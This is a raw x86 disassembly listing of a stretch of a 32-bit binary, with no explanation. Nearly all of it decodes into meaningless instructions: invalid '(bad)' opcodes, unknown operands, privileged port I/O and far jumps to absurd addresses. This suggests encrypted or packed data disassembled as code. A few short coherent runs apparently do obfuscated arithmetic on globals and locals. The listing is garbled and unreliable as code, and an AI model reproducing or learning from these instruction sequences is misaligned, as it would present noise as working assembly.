  40522f:	inc    ecx
  405230:	push   ecx
  405231:	dec    BYTE PTR [ebx-0x54]
  405234:	out    dx,eax
  405235:	add    DWORD PTR ds:0xc9fb8ede,ecx
  40523b:	mov    esp,0xb6009c6b
  405240:	pop    edi
  405241:	push   ebx
  405242:	popa   
  405243:	xor    eax,DWORD PTR [edx-0xdfb6123]
  405249:	repz sbb BYTE PTR [ecx],al
  40524c:	mov    eax,ds:0x6aec18eb
  405251:	or     al,0x42
  405253:	cld    
  405254:	test   BYTE PTR [eax-0x60],dh
  405257:	jbe    0x4052c6
  405259:	inc    ecx
  40525a:	xchg   esp,eax
  40525b:	adc    DWORD PTR [ebx-0x7d],ecx
  40525e:	fild   QWORD PTR [ebp+0x110a10f1]
  405264:	xchg   al,ch
  405266:	mov    ds:0x466a2165,al
  40526b:	jmp    0x40fdf359
  405270:	call   0x2959:0x40e03727
  405277:	fist   WORD PTR [ecx+0x46]
  40527a:	sar    esp,1
  40527c:	adc    edi,ebx
  40527e:	cmp    eax,DWORD PTR [edi]
  405280:	push   edi
  405281:	cmp    BYTE PTR [esp+ebx*1-0x22],0xb8
  405286:	(bad)
  40528b:	cmp    BYTE PTR [eax+0x1b47e560],0x6a
  405292:	dec    ebx
  405293:	pop    ebx
  405294:	and    DWORD PTR [esi],0xf06b34db
  40529a:	cmp    eax,0xe52cdc0a
  40529f:	xchg   ecx,eax
  4052a0:	jbe    0x405317
  4052a2:	adc    al,ah
  4052a4:	ja     0x4052ab
  4052a6:	sbb    DWORD PTR [edx+0xd8860d6],eax
  4052ac:	xlat   BYTE PTR ds:[ebx]
  4052ad:	call   0x1eb1a5b0
  4052b2:	(bad)  
  4052b4:	xchg   esp,eax
  4052b5:	push   fs
  4052b7:	jmp    0xf70b:0xd42aaa49
  4052be:	jo     0x4052ea
  4052c0:	mov    ebx,0x2352915b
  4052c5:	ja     0x4052d1
  4052c7:	loope  0x405267
  4052c9:	sbb    al,0x2
  4052cb:	scas   eax,DWORD PTR es:[edi]
  4052cc:	add    al,0x53
  4052ce:	into   
  4052cf:	mov    esi,0x2302893a
  4052d4:	data16 adc BYTE PTR [edi+ebp*2-0x4f],bl
  4052d9:	aaa    
  4052da:	add    DWORD PTR [ecx+0x8],0x64
  4052de:	fisubr WORD PTR [ecx-0x7f9bd3c]
  4052e4:	mov    esi,0x21fce2b8
  4052e9:	fcomp  DWORD PTR [edi-0x19]
  4052ec:	repz jnp 0x4052bb
  4052ef:	cmp    dl,BYTE PTR [ecx-0x795dabda]
  4052f5:	iret   
  4052f6:	mov    eax,ds:0x5b74d73c
  4052fb:	fs adc edx,esp
  4052fe:	jge    0x405324
  405300:	repnz mov ch,0xb
  405303:	in     eax,0xca
  405305:	dec    ebx
  405306:	popf   
  405307:	pushf  
  405308:	xor    al,0xf
  40530a:	in     eax,0xd5
  40530c:	gs inc edx
  40530e:	pop    es
  40530f:	and    edx,DWORD PTR [ecx+0x5b]
  405312:	enter  0xa7dc,0xf0
  405316:	push   ebp
  405317:	push   es
  405318:	clc    
  405319:	test   al,dl
  40531b:	ss mov ebp,0x47788397
  405321:	xchg   ebp,eax
  405322:	dec    edi
  405323:	pop    ds
  405324:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405326:	aas    
  405327:	(bad)  [ecx+0x2e]
  40532a:	loopne 0x4052cc
  40532c:	popf   
  40532d:	scas   al,BYTE PTR es:[edi]
  40532e:	jp     0x405365
  405330:	nop    eax
  405333:	je     0x405353
  405335:	icebp  
  405336:	jg     0x40539b
  405338:	push   cs
  405339:	sub    eax,0x2e9fa2f5
  40533e:	lahf   
  40533f:	mov    bh,0x98
  405341:	mov    esp,DWORD PTR [eax+ebp*8]
  405344:	jmp    0xe3ef:0xfa75c2b8
  40534b:	icebp  
  40534c:	inc    ebx
  40534d:	pop    ebx
  40534e:	jmp    0xb271:0xe9cba56f
  405355:	inc    esp
  405356:	xchg   edi,esi
  405358:	jmp    0x5e0528ef
  40535d:	jae    0x405362
  40535f:	jle    0x405376
  405361:	adc    DWORD PTR [eax+0x50],esp
  405364:	icebp  
  405365:	dec    ebp
  405366:	pushf  
  405367:	push   edx
  405368:	pop    edi
  405369:	xor    DWORD PTR [edx-0x73],0x21
  40536d:	data16 daa 
  40536f:	addr16 cld 
  405371:	scas   al,BYTE PTR es:[edi]
  405372:	mov    esp,0xd0a1db4d
  405377:	mov    ebx,0xc61009e9
  40537c:	pop    es
  40537d:	scas   eax,DWORD PTR es:[edi]
  40537e:	mov    bh,0x6b
  405380:	hlt    
  405381:	test   BYTE PTR [eax+0x54f83d9c],bh
  405387:	cmp    DWORD PTR [ebx+0x55],edx
  40538a:	xchg   ebx,eax
  40538b:	aad    0x55
  40538d:	cwde   
  40538e:	popa   
  40538f:	lahf   
  405390:	and    al,0xd8
  405392:	stc    
  405393:	xlat   BYTE PTR ds:[ebx]
  405394:	(bad)  
  405395:	add    eax,0x77ca3dfb
  40539a:	mov    ebx,0x17d7d2b9
  40539f:	int3   
  4053a0:	xor    bl,BYTE PTR [esi-0x13]
  4053a3:	loop   0x4053ce
  4053a5:	jnp    0x405343
  4053a7:	mov    ecx,DWORD PTR ss:[esi]
  4053aa:	lea    ebp,[ecx]
  4053ac:	(bad)  
  4053ad:	mov    edx,ebx
  4053af:	cmp    DWORD PTR [edx+0x3c641992],ebx
  4053b5:	push   edx
  4053b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053b7:	push   edi
  4053b8:	sbb    BYTE PTR [esi-0x5c],dl
  4053bb:	pop    ebp
  4053bc:	fcmovu st,st(7)
  4053be:	out    0xd8,eax
  4053c0:	cmp    eax,0x9f2c77e2
  4053c5:	push   ecx
  4053c6:	dec    edx
  4053c7:	or     DWORD PTR [eax+edi*2-0x1528292b],ebp
  4053ce:	or     dl,dh
  4053d0:	call   0xdbf7c55b
  4053d5:	mov    ebp,0x15911fcc
  4053da:	add    cl,al
  4053dc:	cmc    
  4053dd:	adc    DWORD PTR [ebx],esi
  4053df:	pop    edx
  4053e0:	xor    eax,0x15bfc187
  4053e5:	fld    TBYTE PTR [ebx]
  4053e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e8:	call   0xde1d:0x66669201
  4053ef:	pop    es
  4053f0:	outs   dx,DWORD PTR ds:[esi]
  4053f1:	or     eax,0xc6cddc89
  4053f6:	mov    edi,0xbfc1eab1
  4053fb:	mul    DWORD PTR ss:[ebx-0x3f]
  4053ff:	into   
  405400:	xchg   DWORD PTR [edi+esi*4+0x68d55afa],ecx
  405407:	shl    DWORD PTR [ebx+0x5dfda7cf],1
  40540d:	pushf  
  40540e:	jmp    0x9a144872
  405413:	inc    ebx
  405414:	(bad)  
  405415:	fs retf 
  405417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405418:	pop    ebp
  405419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40541a:	and    ebx,ecx
  40541c:	sbb    DWORD PTR [eax-0x7],eax
  40541f:	and    ch,BYTE PTR [edx-0x75]
  405422:	rol    edi,cl
  405424:	cmc    
  405425:	inc    esp
  405426:	das    
  405427:	mov    edx,0x443f831e
  40542c:	das    
  40542d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40542e:	(bad)  
  40542f:	push   0x1f
  405431:	push   cs
  405432:	xchg   esi,eax
  405433:	pushf  
  405434:	pop    esp
  405435:	or     al,0x60
  405437:	or     ebp,ebp
  405439:	mov    dh,0x1e
  40543b:	pop    es
  40543c:	into   
  40543d:	push   es
  40543e:	scas   al,BYTE PTR es:[edi]
  40543f:	pop    eax
  405440:	aaa    
  405441:	xor    BYTE PTR [edi],dl
  405443:	popa   
  405444:	push   edi
  405445:	stc    
  405446:	bts    ebx,esp
  405449:	xor    al,0xdf
  40544b:	lock in al,dx
  40544d:	pop    edx
  40544e:	ret    
  40544f:	cmp    DWORD PTR [ebx+edi*1],0xe0dc2076
  405456:	jmp    0x5d66d182
  40545b:	jp     0x405468
  40545d:	es in  eax,0x2e
  405460:	xchg   edi,edi
  405462:	cmp    edi,DWORD PTR [ebx]
  405464:	cli    
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x3ddafbb8]
  405484:	out    0xe2,eax
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054bb
  40548f:	sahf   
  405490:	adc    DWORD PTR [edx-0x593af4dd],edx
  405496:	adc    al,BYTE PTR [eax-0x48]
  405499:	or     eax,0xa277a98c
  40549e:	lds    edi,FWORD PTR [ebx+0x475412ec]
  4054a4:	jbe    0x405442
  4054a6:	cdq    
  4054a7:	sub    DWORD PTR [ecx-0x4],ecx
  4054aa:	imul   edi,DWORD PTR [esp+ecx*8+0x27],0xffffffb0
  4054af:	dec    edx
  4054b0:	call   0x528d:0x18cf71ce
  4054b7:	or     esi,DWORD PTR [ebx]
  4054b9:	push   eax
  4054ba:	sti    
  4054bb:	add    al,0xab
  4054bd:	stos   DWORD PTR es:[edi],eax
  4054be:	in     al,dx
  4054bf:	dec    esi
  4054c0:	or     ebx,edx
  4054c2:	scas   al,BYTE PTR es:[edi]
  4054c3:	inc    ebx
  4054c4:	out    0x59,al
  4054c6:	sbb    eax,0xe5cb9bf4
  4054cb:	inc    edi
  4054cc:	hlt    
  4054cd:	stos   DWORD PTR es:[edi],eax
  4054ce:	in     eax,0xca
  4054d0:	(bad)  
  4054d1:	fwait
  4054d2:	sar    DWORD PTR [esp+edx*4],cl
  4054d5:	jae    0x4054c8
  4054d7:	xchg   edx,eax
  4054d8:	xchg   DWORD PTR [eax+ecx*8+0x3b],eax
  4054dc:	add    al,0x6
  4054de:	mov    dh,0xfe
  4054e0:	mov    ch,0x46
  4054e2:	adc    BYTE PTR [esi+ecx*2-0x1691a51c],dh
  4054e9:	xchg   ebp,eax
  4054ea:	mov    cl,0x72
  4054ec:	(bad)  
  4054ee:	stc    
  4054ef:	mov    cl,0x8d
  4054f1:	leave  
  4054f2:	pushf  
  4054f3:	cmc    
  4054f4:	test   al,0x5
  4054f6:	test   eax,0x71b13f31
  4054fb:	inc    ecx
  4054fc:	pop    eax
  4054fd:	iret   
  4054fe:	mov    BYTE PTR [ecx+0x2bd8c807],cl
  405504:	pop    eax
  405505:	stos   BYTE PTR es:[edi],al
  405506:	mov    ch,0x34
  405508:	or     al,0x12
  40550a:	cmp    esp,DWORD PTR [esi]
  40550c:	adc    eax,0xc7b18de2
  405511:	mov    edi,0xcbca6d49
  405516:	add    BYTE PTR [esi],ch
  405518:	add    al,0x6a
  40551a:	add    BYTE PTR [ebp+0x69889f4d],ah
  405520:	dec    ebp
  405521:	js     0x405583
  405523:	adc    eax,0xd45561b5
  405528:	ins    BYTE PTR es:[edi],dx
  405529:	mov    WORD PTR [esi],fs
  40552b:	test   BYTE PTR [ebx],0x6c
  40552e:	mov    ds,WORD PTR [edi+0x6]
  405531:	int3   
  405532:	push   ebp
  405533:	mov    ebp,0x6b09441b
  405538:	and    DWORD PTR [eax-0x35],eax
  40553b:	fsubr  QWORD PTR [esi+0x2c]
  40553e:	cli    
  40553f:	test   edx,edi
  405541:	and    BYTE PTR [ecx+esi*4],0x1e
  405545:	in     al,dx
  405546:	inc    ebp
  405547:	out    dx,al
  405548:	pop    ecx
  405549:	xchg   ecx,eax
  40554a:	call   0x598e:0xd460adee
  405551:	int3   
  405552:	mov    edx,0xefa3dd4a
  405557:	jo     0x4054f9
  405559:	popa   
  40555a:	pop    es
  40555b:	stos   BYTE PTR es:[edi],al
  40555c:	cmp    al,0x30
  40555e:	jbe    0x4054e9
  405560:	mov    DWORD PTR ds:0xab00fb11,edi
  405566:	out    0xf2,al
  405568:	mov    ch,0xd8
  40556a:	pop    edi
  40556b:	into   
  40556c:	jmp    0xad05fa99
  405571:	arpl   WORD PTR [edi],dx
  405573:	jmp    DWORD PTR [ebx+0x1b1d08d6]
  405579:	fbstp  TBYTE PTR [eax]
  40557b:	mov    ?,WORD PTR [esi-0x25]
  40557e:	jns    0x4055ab
  405580:	rcl    esi,1
  405582:	scas   eax,DWORD PTR es:[edi]
  405583:	(bad)  
  405584:	mov    ch,0x59
  405586:	jo     0x4055be
  405588:	out    dx,al
  405589:	jle    0x4055a4
  40558b:	pop    edi
  40558c:	mov    dh,0x4
  40558e:	push   es
  40558f:	ins    DWORD PTR es:[edi],dx
  405590:	ja     0x4055db
  405592:	adc    eax,0x940a96a7
  405597:	xchg   ebp,eax
  405598:	arpl   WORD PTR ds:0x2f5090fc,bx
  40559e:	je     0x40561a
  4055a0:	adc    eax,edi
  4055a2:	xchg   esp,eax
  4055a3:	jo     0x405615
  4055a5:	cmp    eax,0x323f7ef2
  4055aa:	xchg   ecx,eax
  4055ab:	or     edi,eax
  4055ad:	sbb    ebx,DWORD PTR [esi]
  4055af:	iret   
  4055b0:	or     eax,0xc666f019
  4055b5:	pop    es
  4055b6:	cld    
  4055b7:	pop    ebx
  4055b8:	jge    0x405621
  4055ba:	int3   
  4055bb:	out    dx,al
  4055bc:	inc    ebx
  4055bd:	jb     0x405611
  4055bf:	mov    ds:0x90112c7a,al
  4055c4:	call   0xa14b:0xf9209b64
  4055cb:	push   edi
  4055cc:	pop    edi
  4055cd:	scas   eax,DWORD PTR es:[edi]
  4055ce:	ja     0x405618
  4055d0:	pusha  
  4055d1:	rol    DWORD PTR [eax],1
  4055d3:	movups XMMWORD PTR [edi+0x342b763e],xmm7
  4055da:	sbb    ebp,DWORD PTR ds:0xa2abdb0b
  4055e0:	lods   eax,DWORD PTR ds:[esi]
  4055e1:	cmp    DWORD PTR [edi+eiz*8],esp
  4055e4:	jae    0x4055ca
  4055e6:	jp     0x405570
  4055e8:	jle    0x405637
  4055ea:	mov    ds:0x38c9fe4e,eax
  4055ef:	sub    eax,0x42061d7
  4055f4:	pop    eax
  4055f5:	cld    
  4055f6:	mov    eax,ds:0x7df3b004
  4055fb:	int    0x27
  4055fd:	(bad)  
  4055fe:	fcomp  DWORD PTR ds:0xf953dadd
  405604:	sbb    edi,esp
  405606:	inc    esp
  405607:	xchg   DWORD PTR [ecx+0x73b58319],eax
  40560d:	adc    DWORD PTR [ecx+0x4f],0x51
  405611:	or     al,0xdf
  405613:	pop    ecx
  405614:	jnp    0x405628
  405616:	mov    bh,0x7b
  405618:	inc    BYTE PTR [esi-0x7d]
  40561b:	jae    0x405638
  40561d:	arpl   WORD PTR [ecx-0x2a060204],cx
  405623:	test   ch,cl
  405625:	inc    edi
  405626:	jecxz  0x405649
  405628:	fmulp  st(7),st
  40562a:	lods   eax,DWORD PTR ds:[esi]
  40562b:	or     bl,BYTE PTR [ebp+ebp*1-0x421eb1bf]
  405632:	loope  0x405659
  405634:	fbstp  TBYTE PTR [esi-0x96b1fe3]
  40563a:	pushf  
  40563b:	stc    
  40563c:	out    dx,eax
  40563d:	xor    esi,DWORD PTR [ecx]
  40563f:	mov    ah,0x6e
  405641:	inc    ecx
  405642:	ss std 
  405644:	shr    edx,1
  405646:	call   0xf13c21dc
  40564b:	mov    ah,BYTE PTR [ebp+0x24bc5b48]
  405651:	add    al,0x9
  405653:	xchg   ecx,eax
  405654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405655:	cwde   
  405656:	xor    DWORD PTR [ecx+0x44fd90d0],0x2f
  40565d:	sub    ebp,edi
  40565f:	icebp  
  405660:	push   ss
  405661:	mulps  xmm4,XMMWORD PTR [ebx]
  405664:	sbb    BYTE PTR [ecx+0x4],dh
  405667:	(bad)  
  405668:	adc    al,0x4e
  40566a:	xchg   ecx,eax
  40566b:	aam    0xe0
  40566d:	jmp    0x67d0:0xb7d20e48
  405674:	push   ss
  405675:	push   ecx
  405676:	pusha  
  405677:	std    
  405678:	sahf   
  405679:	mov    eax,ds:0xa7650ffa
  40567e:	icebp  
  40567f:	or     eax,0x12147ff
  405684:	or     eax,0x72c5cdff
  405689:	mov    edi,0x481ca0c0
  40568e:	popa   
  40568f:	push   ds
  405690:	sub    al,0xae
  405692:	add    ah,BYTE PTR [edi-0x35543c74]
  405698:	xor    eax,0xbd218f43
  40569d:	cwde   
  40569e:	cdq    
  40569f:	and    bh,BYTE PTR [edx]
  4056a1:	out    0xc4,al
  4056a3:	mov    ebx,0x5e7f129a
  4056a8:	fiadd  DWORD PTR [ebx]
  4056aa:	pop    edi
  4056ab:	sar    DWORD PTR [edx+0x2627edf9],1
  4056b1:	sar    dl,cl
  4056b3:	pop    edi
  4056b4:	cdq    
  4056b5:	(bad)  
  4056b6:	sbb    eax,0x945f6a7
  4056bb:	and    ah,bl
  4056bd:	or     DWORD PTR [esi],esp
  4056bf:	mov    edi,0x9c4a7110
  4056c4:	les    esi,FWORD PTR [edi]
  4056c6:	push   ds
  4056c7:	sbb    ch,ah
  4056c9:	mov    esi,0x45c024d5
  4056ce:	cmp    eax,0x260ea514
  4056d3:	xchg   bh,bh
  4056d5:	xchg   dl,ch
  4056d7:	xchg   edi,eax
  4056d8:	dec    edx
  4056d9:	jp     0x405677
  4056db:	call   0x183841cc
  4056e0:	loope  0x4056d2
  4056e2:	test   DWORD PTR [edi+0x77],eax
  4056e5:	fs sub esi,edi
  4056e8:	push   ds
  4056e9:	pop    eax
  4056ea:	jnp    0x40574f
  4056ec:	fild   WORD PTR fs:[ebx]
  4056ef:	and    edi,edi
  4056f1:	inc    ecx
  4056f2:	stc    
  4056f3:	xor    BYTE PTR [ebp-0x11],ah
  4056f6:	in     eax,0x9d
  4056f8:	shl    bl,1
  4056fa:	push   esp
  4056fb:	inc    ecx
  4056fc:	(bad)  
  4056fd:	imul   eax,ebx,0x70d0e259
  405703:	sbb    DWORD PTR [esi],ebp
  405705:	sbb    eax,0x98daac9
  40570a:	outs   dx,BYTE PTR ds:[esi]
  40570b:	jnp    0x4056d4
  40570d:	adc    al,BYTE PTR [ebp+0x71]
  405710:	push   ecx
  405711:	lahf   
  405712:	scas   eax,DWORD PTR es:[edi]
  405713:	inc    eax
  405714:	jo     0x40569f
  405716:	repnz dec esp
  405718:	xlat   BYTE PTR ds:[ebx]
  405719:	test   al,0xe1
  40571b:	in     al,0x8f
  40571d:	push   ebp
  40571e:	repz xchg edx,esi
  405721:	inc    ecx
  405722:	xor    ebp,0x14e808f3
  405728:	(bad)  
  405729:	nop
  40572a:	(bad)  
  40572b:	jb     0x4056ed
  40572d:	xor    eax,0xc5daefb2
  405732:	push   ds
  405733:	mov    ecx,0xe845252d
  405738:	dec    ebx
  405739:	imul   ebp,DWORD PTR [eax+edx*8+0x1f],0xd5ee6b37
  405741:	mov    ch,0xa0
  405743:	and    DWORD PTR [ebx+0x4f],esp
  405746:	fwait
  405747:	jno    0x40574e
  405749:	jecxz  0x4057a5
  40574b:	jae    0x40578c
  40574d:	daa    
  40574e:	push   esi
  40574f:	ret    
  405750:	jp     0x40572a
  405752:	fild   QWORD PTR [edx-0x41]
  405755:	xor    esp,DWORD PTR [ecx]
  405757:	mov    dl,0x48
  405759:	fadd   st(0),st
  40575b:	idiv   DWORD PTR [esi+eax*1-0xd50a5a4]
  405762:	pusha  
  405763:	call   0xecadf776
  405768:	lahf   
  405769:	push   esi
  40576a:	loopne 0x405720
  40576c:	pop    eax
  40576d:	test   bh,0x88
  405770:	js     0x405783
  405772:	inc    esp
  405773:	inc    ecx
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xc2
  4057f5:	inc    ebp
  4057f6:	call   0x7e7e:0x363a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	repz fstp DWORD PTR [ecx+0x1e]
  405804:	sbb    eax,0x4197fbae
  405809:	daa    
  40580a:	test   DWORD PTR [ebp-0x26a8269b],ebx
  405810:	clc    
  405811:	sahf   
  405812:	add    BYTE PTR [ebx-0x7d628b8d],al
  405818:	mov    bh,0x1c
  40581a:	lods   eax,DWORD PTR ds:[esi]
  40581b:	das    
  40581c:	retf   0x3fdd
  40581f:	sbb    ax,0x5bf8
  405823:	inc    ebp
  405824:	data16 test BYTE PTR [esi-0x32ed4656],bl
  40582b:	jecxz  0x4058a6
  40582d:	dec    esi
  40582e:	xchg   esp,esi
  405830:	pop    edi
  405831:	sub    al,BYTE PTR [ecx]
  405833:	lods   eax,DWORD PTR ds:[esi]
  405834:	adc    ah,bl
  405836:	mov    DWORD PTR [ecx],0x3badfd5c
  40583c:	mov    edx,0x9a7423a1
  405841:	data16 fwait
  405843:	pushf  
  405844:	dec    ebp
  405845:	inc    ecx
  405846:	ficomp WORD PTR [edi]
  405848:	das    
  405849:	push   ds
  40584a:	(bad)  
  40584b:	or     eax,esi
  40584d:	in     eax,dx
  40584e:	xor    bl,bl
  405850:	rcl    BYTE PTR [ecx-0x110c5dfc],cl
  405856:	aam    0xa4
  405858:	test   eax,0x5a29eaaa
  40585d:	ficom  WORD PTR [esi-0x6bf9cebe]
  405863:	rcr    BYTE PTR [esi+0x3643eb7],1
  405869:	mov    bl,0x87
  40586b:	hlt    
  40586c:	and    ch,dl
  40586e:	xor    dl,BYTE PTR [esi+0x31]
  405871:	sub    ecx,esi
  405873:	push   ebp
  405874:	pop    ds
  405875:	loop   0x4058b5
  405877:	push   es
  405878:	sar    BYTE PTR [ecx+0x5b67e35e],1
  40587e:	test   BYTE PTR [edi],bl
  405880:	mov    ah,BYTE PTR [ecx]
  405882:	mov    WORD PTR [ebx+0x6e],es
  405885:	jo     0x40582e
  405887:	mov    dl,0x31
  405889:	js     0x4058fa
  40588b:	sbb    al,0x51
  40588d:	cld    
  40588e:	ret    0x3288
  405891:	fcomp  QWORD PTR [edx]
  405893:	(bad)  
  405894:	es push ds
  405896:	aam    0x2a
  405898:	inc    esp
  405899:	lahf   
  40589a:	test   BYTE PTR [ebx+0x4b],al
  40589d:	mov    esp,0xe0e550b1
  4058a3:	dec    ecx
  4058a4:	ss jae 0x4058e2
  4058a7:	mov    WORD PTR [ebp+edx*2-0x25f5816c],?
  4058ae:	push   edi
  4058af:	lods   al,BYTE PTR ds:[esi]
  4058b0:	data16 xor ah,BYTE PTR ds:0x5cec7f43
  4058b7:	ja     0x40591f
  4058b9:	test   eax,0x4d069e73
  4058be:	dec    ebx
  4058bf:	or     eax,DWORD PTR [edx+0x65612c04]
  4058c5:	loop   0x4058cf
  4058c7:	enter  0x8fb7,0x7f
  4058cb:	fcmovu st,st(0)
  4058cd:	xor    al,0xf5
  4058cf:	rcl    DWORD PTR [edx],1
  4058d1:	inc    edi
  4058d2:	dec    edi
  4058d3:	sub    DWORD PTR [ebx],edx
  4058d5:	sbb    eax,0x260d71b
  4058da:	test   al,0x22
  4058dc:	test   bh,dl
  4058de:	xchg   edx,eax
  4058df:	pop    eax
  4058e0:	mov    ds:0xe36b1d88,al
  4058e5:	add    ch,bl
  4058e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e8:	sbb    DWORD PTR [ebx+0x38],0xcbcc8cfc
  4058ef:	sub    al,0xfe
  4058f1:	fdivr  QWORD PTR [ecx-0x5a]
  4058f4:	pop    edi
  4058f5:	xchg   edi,eax
  4058f6:	mov    ds:0x61804a54,al
  4058fb:	xchg   ebp,eax
  4058fc:	dec    ebp
  4058fd:	sbb    eax,0xc98abd43
  405902:	push   cs
  405903:	mov    esp,0x121af0ed
  405908:	arpl   WORD PTR [edi],ax
  40590a:	outs   dx,DWORD PTR ds:[esi]
  40590b:	or     eax,0x4e5ad101
  405910:	sub    BYTE PTR [eax-0x3ef77d30],ch
  405916:	push   esp
  405917:	inc    edi
  405918:	mov    bl,0xde
  40591a:	repz iret 
  40591c:	shl    DWORD PTR [ebp-0x959cbfc],cl
  405922:	fld    QWORD PTR [esi-0x40]
  405925:	push   ds
  405926:	xor    al,0x97
  405928:	jp     0x40598d
  40592a:	mov    bl,0xf1
  40592c:	adc    dh,bl
  40592e:	sub    BYTE PTR [eax-0x9],ah
  405931:	into   
  405932:	pop    esp
  405933:	int3   
  405934:	dec    ebp
  405935:	in     eax,dx
  405936:	cmp    al,0x62
  405938:	xchg   esp,eax
  405939:	mov    eax,0x2fee29e2
  40593e:	xlat   BYTE PTR ds:[ebx]
  40593f:	arpl   WORD PTR [ebx-0x74],cx
  405942:	xor    al,0x21
  405944:	or     eax,0xd22bf0a9
  405949:	inc    esi
  40594a:	jo     0x405945
  40594c:	push   ebp
  40594d:	ficomp DWORD PTR [edi]
  40594f:	out    0xf9,eax
  405951:	pop    ds
  405952:	sub    BYTE PTR [ebp-0x5c29ae7a],al
  405958:	scas   al,BYTE PTR es:[edi]
  405959:	stc    
  40595a:	icebp  
  40595b:	test   al,0x81
  40595d:	jmp    0x5b24:0x83eb1037
  405964:	mov    al,ds:0x7d2ead56
  405969:	cwde   
  40596a:	(bad)  
  40596b:	push   ebx
  40596c:	mov    bl,0xe2
  40596e:	popf   
  40596f:	sbb    ebp,DWORD PTR [ebp+0x52]
  405972:	dec    eax
  405973:	pop    eax
  405974:	out    0x57,al
  405976:	daa    
  405977:	cdq    
  405978:	jle    0x4058ff
  40597a:	push   edx
  40597b:	loop   0x4059f0
  40597d:	ret    0xdc2e
  405980:	dec    ebx
  405981:	in     eax,0xb0
  405983:	mov    ch,0x20
  405985:	mov    bl,0x35
  405987:	fwait
  405988:	dec    edi
  405989:	add    eax,0x3d180e1
  40598e:	sbb    BYTE PTR [edx],dh
  405990:	push   ss
  405991:	inc    eax
  405992:	cmp    DWORD PTR [ecx+ebp*1-0x1e2dff74],ebp
  405999:	jl     0x4059bf
  40599b:	les    ecx,FWORD PTR [edi]
  40599d:	aad    0xbe
  40599f:	pop    ss
  4059a0:	sub    cl,al
  4059a2:	or     BYTE PTR [edi],ah
  4059a4:	(bad)  
  4059a5:	sbb    al,0xe3
  4059a7:	(bad)  
  4059a8:	sub    DWORD PTR [esi-0x1a],edi
  4059ab:	or     al,BYTE PTR [ebx]
  4059ad:	es jmp 0x19f4:0x52fb2c5a
  4059b5:	sbb    DWORD PTR [esi-0x1b],ebx
  4059b8:	in     eax,0xb2
  4059ba:	jne    0x405948
  4059bc:	add    eax,0x1af873b6
  4059c1:	push   esi
  4059c2:	out    dx,al
  4059c3:	mov    esp,0x771e15d9
  4059c8:	ror    ch,1
  4059ca:	stos   DWORD PTR es:[edi],eax
  4059cb:	sbb    eax,0x6c8084a6
  4059d0:	test   BYTE PTR [edi],0x40
  4059d3:	pop    ebp
  4059d4:	adc    al,0xbe
  4059d6:	(bad)  
  4059d7:	addr16 sti 
  4059d9:	dec    ecx
  4059db:	mov    eax,ds:0xbb365aa0
  4059e0:	xor    al,0x2e
  4059e2:	test   al,0x2e
  4059e4:	jle    0x405a39
  4059e6:	dec    DWORD PTR [ebp+0x5d80ccde]
  4059ec:	outs   dx,BYTE PTR ds:[esi]
  4059ed:	xor    bl,BYTE PTR [edx+eax*8]
  4059f0:	inc    ebx
  4059f1:	iret   
  4059f2:	adc    ebp,DWORD PTR [ebp-0x2f3e4098]
  4059f8:	add    eax,ebp
  4059fa:	or     eax,0x35000015
  4059ff:	jmp    0x4059a0
  405a01:	in     eax,0x95
  405a03:	(bad)  
  405a04:	loop   0x40599b
  405a06:	adc    al,0xfc
  405a08:	mov    bh,BYTE PTR [edi]
  405a0a:	mov    ch,0xfb
  405a0c:	(bad)  
  405a0d:	mov    bl,0xa8
  405a0f:	test   BYTE PTR [ebx+0x107d4089],ah
  405a15:	fnstcw WORD PTR [esi-0x3930b5d0]
  405a1b:	leave  
  405a1c:	call   0x31424013
  405a21:	sbb    al,0x19
  405a23:	push   edi
  405a24:	enter  0xa68,0x58
  405a28:	out    dx,al
  405a29:	jmp    0x9e88748b
  405a2e:	cwde   
  405a2f:	stc    
  405a30:	in     eax,0xae
